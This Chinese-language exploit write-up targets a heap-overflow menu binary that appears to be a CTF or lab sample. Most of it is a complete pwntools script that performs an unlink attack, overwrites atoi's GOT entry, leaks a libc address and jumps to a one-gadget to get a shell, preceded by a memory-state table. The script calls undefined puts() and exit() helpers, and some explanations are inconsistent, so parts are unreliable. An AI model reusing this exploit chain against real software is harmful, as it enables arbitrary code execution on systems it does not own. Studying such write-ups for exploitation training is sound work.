# 漏洞利用文档

## 执行环境
基于exp脚本和调试信息分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接
- **保护机制**：从exp使用libc泄露和one-gadget推断，ASLR可能开启，NX可能启用（但通过代码执行绕过）
- **依赖库**：标准C库（libc），通过`ldd`推断依赖动态链接器
- **运行平台**：Linux系统，使用pwntools进行漏洞利用
- **关键检查**：未明确提及Canary、PIE等，但从利用过程看，堆管理结构可被覆盖

## 漏洞成因
### 关键结构体
程序使用两个全局数组管理物品：
- `unk_6020C8`（实际为`itemlist+8`）：存储物品名称指针（每个元素8字节）
- `itemlist`：存储物品名称长度（每个元素4字节）
- 每个物品占用相同索引位置，最多100个物品

### 漏洞分析
**漏洞位置**：`change_item()`函数中的堆缓冲区溢出

**反编译代码关键部分**：
```c
printf("Please enter the length of item name:");
read(0, nptr, 8u);
v2 = atoi(nptr);  // 用户控制的新长度
printf("Please enter the new name of the item:");
*(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
```

**漏洞原因**：
1. **缺乏长度验证**：程序允许用户重新指定物品名称长度（v2），但未验证新长度是否超过原始malloc分配的大小
2. **直接使用用户输入**：使用用户控制的v2作为read函数的长度参数，导致可写入超出原始缓冲区的数据
3. **堆溢出后果**：覆盖相邻堆块的元数据（prev_size、size字段），可能破坏堆管理结构，最终实现任意代码执行

**漏洞类型**：堆缓冲区溢出（Heap Buffer Overflow）

## 漏洞利用过程
基于exp步进调试，整个利用过程的内存变化如下表所示：

| 步骤 | 操作 | 关键内存变化 | 利用阶段 |
|------|------|--------------|----------|
| 1 | malloc(0x80, b'aaaa'); malloc(0x80, b'bbbb') | - 分配块0 (0x1256d020) 和块1 (0x1256d0b0)<br>- 全局数组：块0指针=0x1256d030, 长度=0x80; 块1指针=0x1256d0c0, 长度=0x0（异常） | 初始布局 |
| 2 | change(0, 0x90, py1) | - 块0用户数据被覆盖为伪造堆结构<br>- 块1 prev_size=0x80→0x80, size=0x91→0x90<br>- 覆盖块1用户数据首字节 | 堆溢出 |
| 3 | free(1) | - 触发unlink攻击<br>- 全局数组：itemlist[0]指针=0x1256d030→0x602068（GOT）<br>- 块1被释放 | Unlink攻击 |
| 4 | change(0, len(py2), py2) | - stdin结构被覆盖（前24字节='a'）<br>- atoi GOT从PLT(0x4006a6)→libc(0x72a004d96e90) | 任意写 |
| 5 | puts() | 泄露libc地址，用于计算one-gadget偏移 | 信息泄露 |
| 6 | 解析atoi地址 | atoi_addr = u64(...) → 0x72a004d96e90 | 地址计算 |
| 7 | change(0, 0x10, p64(onegadget)) | atoi GOT被覆盖为one-gadget地址(0x72a004e503a4) | GOT劫持 |
| 8 | exit() | 触发atoi调用，执行one-gadget，启动/bin/dash | 代码执行 |
| 9 | interactive() | 获得shell控制权，进程完全切换 | 权限获取 |

### 内存布局演变
- **初始堆**：连续分配块0和块1，每个大小0x91（含元数据）
- **溢出后**：块0伪造fd/bk指向全局变量，块1元数据被修改
- **Unlink后**：全局数组被修改，获得任意写能力
- **最终状态**：原始进程被/bin/dash替换，内存映射完全改变

## Exploit
以下是带详细注释的漏洞利用脚本：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample8')
p = process('./data/sample8')
libc = elf.libc  # 获取libc用于计算偏移

# 工具函数定义
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size, content):
    """分配堆块：设置物品名称长度和内容"""
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    """释放堆块：删除指定索引的物品"""
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))

def change(index, size, content):
    """修改物品：利用漏洞进行堆溢出"""
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))  # 关键：用户控制的大小，导致溢出
    ru("Please enter the new name of the item:")
    sd(content)

# 利用开始
# Step 1: 初始化堆布局，分配两个相邻块
malloc(0x80, b'aaaa')
malloc(0x80, b'bbbb')

# Step 2: 构造伪造堆块进行溢出
FD = 0x6020c8 - 3*8  # 伪造fd指针，指向全局数组附近
BK = FD + 8          # 伪造bk指针
# 构造payload：伪造堆块元数据 + 填充 + 覆盖相邻块元数据
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90)
change(0, 0x90, py1)  # 溢出覆盖块1的元数据

# Step 3: 释放块1触发unlink攻击
free(1)  # unlink修改全局数组，获得任意写能力

# Step 4: 利用任意写覆盖GOT条目
atoi_got = elf.got["atoi"]  # 目标GOT条目
py2 = b'a'*24 + p64(atoi_got)  # 覆盖stdin结构并指向atoi GOT
change(0, len(py2), py2)

# Step 5: 泄露libc地址
puts()  # 触发输出，泄露atoi的实际地址

# Step 6: 计算libc基址和one-gadget地址
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8, b'\x00'))  # 解析泄露的地址
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4  # 计算one-gadget偏移

# Step 7: 覆盖atoi GOT为one-gadget
change(0, 0x10, p64(onegadget))

# Step 8: 触发漏洞执行
exit()  # 调用atoi，跳转到one-gadget

# Step 9: 获得shell控制
p.interactive()  # 交互式shell
```

### 关键注释说明
- **堆布局初始化**：步骤1创建两个相邻堆块，为溢出提供目标
- **伪造堆块**：步骤2精心构造payload，覆盖相邻块元数据为伪造值，为unlink做准备
- **Unlink攻击**：步骤3通过释放触发unlink，修改全局数组获得任意写能力
- **GOT劫持**：步骤4-7利用任意写覆盖atoi的GOT条目，将其指向libc中的one-gadget
- **代码执行**：步骤8通过exit()触发atoi调用，执行one-gadget获得shell

此利用成功演示了如何通过堆溢出漏洞实现完整的代码执行链。
